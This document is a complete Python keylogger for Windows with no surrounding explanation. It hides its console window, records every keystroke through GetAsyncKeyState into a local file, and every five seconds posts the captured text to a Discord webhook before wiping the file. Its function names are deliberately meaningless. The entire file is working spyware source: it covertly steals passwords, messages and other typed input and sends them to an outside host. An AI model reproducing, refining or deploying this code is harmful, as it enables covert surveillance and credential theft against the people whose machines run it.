import os
import time
import requests
import ctypes
import win32api
import win32console
import win32gui
import threading

discord = 'asdasdasdasadasootherpeoplecantgetmydiscrodwebhook'
a = "s.txt"

win32console.GetConsoleWindow()
win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)

KEY = {
    0x08: '[BACKSPACE]',
    0x09: '[TAB]',
    0x0D: '[ENTER]',
    0x10: '[SHIFT]',
    0x11: '[CTRL]',
    0x12: '[ALT]',
    0x20: '[SPACE]',
    0x25: '[LEFT]',
    0x26: '[UP]',
    0x27: '[RIGHT]',
    0x28: '[DOWN]',
}

def ttad(y):
    data = {
        "content": y
    }
    requests.post(discord, json=data)

def weww():
    for i in range(0, 256):
        if win32api.GetAsyncKeyState(i) & 0x0001:
            if i in KEY:
                return KEY[i]
            else:
                return chr(i) if 32 <= i <= 126 else f"[{i}]"
    return None

def grgrgr():
    while True:
        key = weww()
        if key:
            with open(a, "a") as qqweqq:
                qqweqq.write(key)
        time.sleep(0.01)

def t():
    while True:
        time.sleep(5)
        if os.path.exists(a):
            with open(a, 'r') as f:
                y = f.read()
            ttad(y)
            with open(a, "w") as lol:
                lol.write("")
                
threading.Thread(target=grgrgr).start()
threading.Thread(target=t).start()
